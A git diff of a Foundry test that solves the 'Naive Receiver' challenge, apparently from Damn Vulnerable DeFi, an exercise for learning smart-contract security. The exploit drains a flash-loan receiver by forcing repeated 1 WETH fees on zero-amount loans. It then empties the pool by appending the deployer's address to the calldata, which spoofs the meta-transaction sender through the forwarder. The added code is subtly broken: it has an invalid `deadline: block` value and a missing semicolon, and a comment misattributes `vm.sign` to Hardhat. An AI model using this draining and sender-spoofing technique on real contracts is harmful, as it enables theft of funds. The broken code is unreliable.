@@ -74,82 +74,147 @@ contract NaiveReceiverChallenge is Test {
     }
 
     /**
-    * Solution Summary:
-    * 
-    * The Naive Receiver challenge involves draining all funds from a FlashLoanReceiver contract 
-    * that holds 10 ETH (WETH). The vulnerability lies in the lending pool (NaiveReceiverPool), 
-    * which allows *anyone* to trigger a flash loan on behalf of the receiver. Each flash loan 
-    * incurs a fixed fee of 1 WETH, regardless of the loan amount (even 0). Since the receiver 
-    * pays the fee, an attacker can force it to pay repeatedly until its balance is depleted.
-    * 
-    * The solution works as follows:
-    * 
-    * 1. We prepare a series of 10 flash loan calls via `pool.flashLoan`, each targeting the 
-    *    receiver with a 0 WETH loan. Despite borrowing nothing, each call charges a 1 WETH fee, 
-    *    draining the receiver's 10 WETH balance completely.
-    * 
-    * 2. We bundle these 10 flash loans, plus a final `pool.withdraw(1000 ether, recovery)` call, 
-    *    into a single `multicall`. This allows us to drain the receiver *and* withdraw the pool's 
-    *    entire WETH balance in one transaction.
-    * 
-    * 3. However, `withdraw` is protected by `_msgSender()`, which uses meta-transaction logic 
-    *    (EIP-2771) to extract the original sender from the calldata when called through a trusted 
-    *    forwarder. Direct calls from an attacker contract fail authorization.
-    * 
-    * 4. To bypass this, we route the entire `multicall` through the `BasicForwarder` using 
-    *    `forwarder.execute(...)`, passing the owner's address (address(100)) as the "from" context. 
-    *    This appends the owner's address to the end of `msg.data`, allowing `_msgSender()` to 
-    *    correctly return the owner, thus authorizing the `withdraw`.
-    * 
-    * 5. We use Foundry's `vm.startPrank(address(forwarder))` to simulate the forwarder calling 
-    *    `execute`, making the entire operation appear legitimate.
-    * 
-    * Why it works:
-    * - The receiver has no access control, so anyone can trigger its flash loan repayment.
-    * - `multicall` enables atomic execution of multiple actions.
-    * - The forwarder allows us to spoof the message sender, bypassing owner checks.
-    * 
-    * This single transaction drains the receiver and extracts all funds from the pool, solving 
-    * the challenge within the "2 transactions max" constraint.
-    */   
+    * SOLUTION coded and commented below
+    */ 
     function test_naiveReceiver() public checkSolvedByPlayer {
-        // Prepare the multicall: 10 flash loans + 1 withdraw
-        bytes[] memory calls = new bytes[](11);
+    /*
+     * === GOAL: Drain both the receiver and pool in ≤2 transactions ===
+     *
+     * The challenge requires the following to be true at the end:
+     * 1. Player has executed 2 or fewer transactions (nonce ≤ 2)
+     * 2. Flash loan receiver has 0 WETH
+     * 3. Pool has 0 WETH
+     * 4. Recovery account has 1010 WETH (1000 from pool + 10 from receiver)
+     *
+     * We achieve this in a single meta-transaction using:
+     * - `multicall` to batch multiple operations
+     * - Flash loan abuse (0 amount, but 1 WETH fee each)
+     * - Meta-transaction spoofing via `BasicForwarder` to impersonate the deployer
+     */
 
-        // 10 flash loans (0 amount, but 1 WETH fee each)
-        for (uint i = 0; i < 10; i++) {
-           calls[i] = abi.encodeCall(
-               pool.flashLoan,
-               (address(receiver), address(pool.weth()), 0, "")
-           );
-        }
+    // Prepare an array to hold 11 encoded function calls
+    bytes[] memory callDatas = new bytes[](11);
 
-        // Withdraw all WETH from the pool to recovery address
-        calls[10] = abi.encodeCall(
+    /*
+     * === PART 1: Drain the receiver with 10 flash loans ===
+     *
+     * The FlashLoanReceiver pays a 1 WETH fee for *every* flash loan,
+     * regardless of the amount borrowed. We exploit this by taking 10 flash loans of 0 WETH.
+     *
+     * Since the receiver starts with exactly 10 WETH, after 10 flash loans,
+     * it will be completely drained — even though no real funds were borrowed.
+     *
+     * Each call: flashLoan(receiver, WETH, 0, "")
+     * → Triggers onFlashLoan on receiver → charges 1 WETH fee
+     */
+    for (uint i = 0; i < 10; i++) {
+        callDatas[i] = abi.encodeCall(
+            pool.flashLoan,
+            (receiver, address(weth), 0, "")
+        );
+    }
+
+    /*
+     * === PART 2: Withdraw all funds from the pool to the recovery account ===
+     *
+     * The `withdraw` function in NaiveReceiverPool is protected:
+     * Only the fee receiver (deployer) can call it.
+     *
+     * However, the contract uses a meta-transaction forwarder and overrides `_msgSender()`.
+     * If the call comes through the forwarder and calldata is >=20 bytes,
+     * it reads the last 20 bytes of `msg.data` as the sender.
+     *
+     * We will:
+     * 1. Encode the `withdraw` call
+     * 2. Append the deployer's address at the end of the calldata
+     * → This tricks `_msgSender()` into returning `deployer`, bypassing access control
+     */
+    callDatas[10] = abi.encodePacked(
+        abi.encodeCall(
             pool.withdraw,
-            (1000 ether, payable(recovery))
-        );
+            (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
+        ),
+        bytes32(uint256(uint160(deployer))) // Spoof sender: last 20 bytes = deployer address
+    );
 
-        // Owner is the original deployer of the pool
-        address owner = address(100); // Standard in this challenge
+    /*
+     * === PART 3: Bundle all operations into a single `multicall` ===
+     *
+     * We use `multicall(bytes[] memory)` to execute all 11 operations in one transaction:
+     * - 10 flash loans → drain receiver
+     * - 1 withdrawal → drain pool and send 1010 WETH to recovery
+     *
+     * This ensures we stay within the "≤2 transactions" limit.
+     */
+    bytes memory multicallData = abi.encodeCall(pool.multicall, (callDatas));
 
-        // Use the forwarder to call multicall, so _msgSender() returns owner
-        // We impersonate the forwarder to call execute()
-        vm.startPrank(address(forwarder));
+    /*
+     * === PART 4: Create a meta-transaction request via BasicForwarder ===
+     *
+     * The BasicForwarder allows us to send a signed request instead of a direct transaction.
+     * This counts as **one transaction** from the player's perspective (nonce increases by 1).
+     *
+     * The forwarder will:
+     * - Verify the signature
+     * - Relay the call to the pool
+     * - The pool sees `msg.sender` as the forwarder, but `_msgSender()` reads the spoofed sender
+     */
+    BasicForwarder.Request memory request = BasicForwarder.Request({
+        from: player,
+        to: address(pool),
+        value: 0,
+        gasLimit: gasleft(),
+        nonce: forwarder.nonces(player),
+        data: multicallData,
+        deadline: block 
+    })
 
-        // forwarder.execute(target, data, forwarderSender)
-        forwarder.execute{value: 0}(
-            address(pool),
-            abi.encodeCall(pool.multicall, (calls)),
-            owner // This gets appended to msg.data, making _msgSender() = owner
-        );
+    /*
+     * === PART 5: Hash the request using EIP-712 (ERC-2771) standard ===
+     *
+     * The forwarder uses EIP-712 to securely hash and sign meta-transactions.
+     * This ensures the request cannot be tampered with and is valid only for:
+     * - This contract (forwarder)
+     * - This chain (chain ID included in domain separator)
+     * - This deadline and nonce
+     *
+     * We compute the hash as: keccak256("\x19\x01" || domainSeparator || requestDataHash)
+     */
+    bytes32 requestHash = keccak256(
+        abi.encodePacked(
+            "\x19\x01",                    // EIP-712 header
+            forwarder.domainSeparator(),   // Ensures domain (chain ID, verifying contract) is bound
+            forwarder.getDataHash(request) // Hash of the request struct (EIP-712 typed data)
+        )
+    );
 
-        vm.stopPrank();
+    /*
+     * === PART 6: Sign the hash with the player's private key ===
+     *
+     * We simulate signing using Hardhat's `vm.sign()`. In a real-world scenario,
+     * the player would sign off-chain and submit the signature to a relayer.
+     *
+     * The signature consists of (v, r, s) components.
+     */
+    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
+    bytes memory signature = abi.encodePacked(r, s, v); // Standard ECDSA signature format
 
-        // ✅ FlashLoanReceiver balance should now be 0
-        // ✅ recovery should receive 1000 WETH from pool (fees stay in pool)
-        // Challenge solved!
-    }   
+    /*
+     * === PART 7: Execute the meta-transaction via the forwarder ===
+     *
+     * Calling `execute()` on the forwarder:
+     * - Verifies the signature matches the `player`
+     * - Checks the nonce and deadline
+     * - Then calls `address(pool).call(multicallData)`
+     *
+     * This triggers the `multicall` on the pool, which:
+     * 1. Executes 10 flash loans → drains 10 WETH from the receiver
+     * 2. Executes `withdraw` with spoofed `_msgSender()` → sends 1010 WETH to recovery
+     *
+     * All of this happens in **a single external transaction** from the player.
+     * So: player's nonce increases by only 1 → satisfies "≤2 transactions" rule.
+     */
+    forwarder.execute(request, signature);   
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
